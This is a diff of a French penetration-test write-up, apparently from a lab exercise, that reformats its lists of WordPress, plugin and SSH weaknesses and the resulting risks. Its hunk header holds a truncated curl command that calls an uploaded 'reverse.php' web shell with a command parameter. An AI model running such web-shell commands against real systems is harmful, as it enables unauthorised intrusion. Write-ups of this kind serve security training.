@@ -329,15 +329,15 @@ curl "http://192.168.1.4/assets/fonts/blog/wp-content/uploads/reverse.php?cmd=ba
 
 ### 🔑 Vulnérabilités Identifiées
 
-1. **WordPress obsolète** : Des versions antérieures de WordPress sont souvent vulnérables à des attaques de type XSS et injection SQL.
-2. **Plugins vulnérables** : Des plugins non mis à jour peuvent contenir des failles exploitées pour obtenir un accès non autorisé ou exécuter du code malveillant.
-3. **Exposition du service SSH** : Le service SSH, s'il est mal configuré ou si les mots de passe sont faibles, peut être bruteforcé ou exploité pour un accès non autorisé.
+**WordPress obsolète** : Des versions antérieures de WordPress sont souvent vulnérables à des attaques de type XSS et injection SQL.  
+**Plugins vulnérables** : Des plugins non mis à jour peuvent contenir des failles exploitées pour obtenir un accès non autorisé ou exécuter du code malveillant.  
+**Exposition du service SSH** : Le service SSH, s'il est mal configuré ou si les mots de passe sont faibles, peut être bruteforcé ou exploité pour un accès non autorisé.
 
 ### 🚨 Risques et Conséquences
 
-- **Prise de contrôle de l’instance WordPress** : Un attaquant peut obtenir un contrôle total sur le site WordPress, modifiant le contenu ou redirigeant les visiteurs vers des sites malveillants.
-- **Accès aux fichiers sensibles** : Les fichiers de configuration, les bases de données et d'autres données sensibles peuvent être accédés, compromettant la confidentialité des informations.
-- **Possibilité d’escalade de privilèges** : À partir d'un accès initial limité, un attaquant pourrait escalader ses privilèges jusqu'à obtenir un contrôle total sur le système d'exploitation sous-jacent.
+**Prise de contrôle de l’instance WordPress** : Un attaquant peut obtenir un contrôle total sur le site WordPress, modifiant le contenu ou redirigeant les visiteurs vers des sites malveillants.  
+**Accès aux fichiers sensibles** : Les fichiers de configuration, les bases de données et d'autres données sensibles peuvent être accédés, compromettant la confidentialité des informations.  
+**Possibilité d’escalade de privilèges** : À partir d'un accès initial limité, un attaquant pourrait escalader ses privilèges jusqu'à obtenir un contrôle total sur le système d'exploitation sous-jacent.
 
 ---
 
